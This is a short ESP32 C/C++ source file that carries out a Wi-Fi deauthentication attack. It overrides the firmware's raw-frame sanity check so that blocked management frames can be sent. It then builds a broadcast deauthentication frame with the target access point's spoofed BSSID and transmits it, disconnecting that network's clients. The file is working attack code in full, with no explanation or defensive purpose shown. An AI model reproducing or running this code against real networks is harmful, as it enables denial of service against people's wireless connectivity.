#include <esp_system.h>
#include <esp_wifi.h>



extern wifi_ap_record_t accessPointInfo;



extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
	if (arg == 31337) { return 1; }
	else { return 0; }
}



void deauthAttack();



void deauthAttack() {
	u8_t * targetBSSID = accessPointInfo.bssid;

	uint8_t packet[] = {
		0xC0, 0x00,
		0x3A, 0x00,
		0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
		targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
		targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
		0xF0, 0xFF,
		0x02, 0x00
	};

	esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}